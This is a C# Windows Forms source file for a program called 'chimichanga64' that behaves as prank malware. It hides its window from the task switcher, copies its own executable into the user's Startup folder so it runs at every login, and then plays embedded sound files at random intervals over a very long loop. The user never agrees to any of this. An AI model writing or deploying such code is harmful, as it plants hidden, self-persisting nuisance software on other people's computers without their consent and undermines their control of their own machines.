using System;
using System.IO;
using System.Media;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace chimichanga64
{
    public partial class changaform0 : Form
    {
        public changaform0()
        {
            InitializeComponent();
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private void changaform0_Load(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
            {
                System.Windows.Forms.Application.Exit();
            }

            else
            {
                try
                {
                    string exePath = "chimichanga64.exe";
                    string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    copyPath += "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Path.GetFileName(exePath);
                    File.Copy(exePath, copyPath);
                }
                catch
                {

                }

                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                while (stopwatch.Elapsed < TimeSpan.FromMilliseconds(2019644928000))
                {
                    Thread.Sleep(new Random().Next(1, 3840000));
                    Random rnd = new Random(Guid.NewGuid().GetHashCode());
                    int choices = rnd.Next(0, 6);
                    switch (choices)
                    {
                        case 0:
                            System.Reflection.Assembly a0 = System.Reflection.Assembly.GetExecutingAssembly();
                            System.IO.Stream s0 = a0.GetManifestResourceStream("chimichanga64.friend.0.wav");
                            SoundPlayer player0 = new SoundPlayer(s0);
                            player0.Play();
                            break;

                        case 1:
                            System.Reflection.Assembly a1 = System.Reflection.Assembly.GetExecutingAssembly();
                            System.IO.Stream s1 = a1.GetManifestResourceStream("chimichanga64.friend.1.wav");
                            SoundPlayer player1 = new SoundPlayer(s1);
                            player1.Play();
                            break;

                        case 2:
                            System.Reflection.Assembly a2 = System.Reflection.Assembly.GetExecutingAssembly();
                            System.IO.Stream s2 = a2.GetManifestResourceStream("chimichanga64.friend.2.wav");
                            SoundPlayer player2 = new SoundPlayer(s2);
                            player2.Play();
                            break;

                        case 3:
                            System.Reflection.Assembly a3 = System.Reflection.Assembly.GetExecutingAssembly();
                            System.IO.Stream s3 = a3.GetManifestResourceStream("chimichanga64.friend.3.wav");
                            SoundPlayer player3 = new SoundPlayer(s3);
                            player3.Play();
                            break;
                        case 4:
                            System.Reflection.Assembly a4 = System.Reflection.Assembly.GetExecutingAssembly();
                            System.IO.Stream s4 = a4.GetManifestResourceStream("chimichanga64.friend.3.wav");
                            SoundPlayer player4 = new SoundPlayer(s4);
                            player4.Play();
                            break;
                        case 5:
                            System.Reflection.Assembly a5 = System.Reflection.Assembly.GetExecutingAssembly();
                            System.IO.Stream s5 = a5.GetManifestResourceStream("chimichanga64.friend.3.wav");
                            SoundPlayer player5 = new SoundPlayer(s5);
                            player5.Play();
                            break;
                    }
                }
            }       
        }
    }
}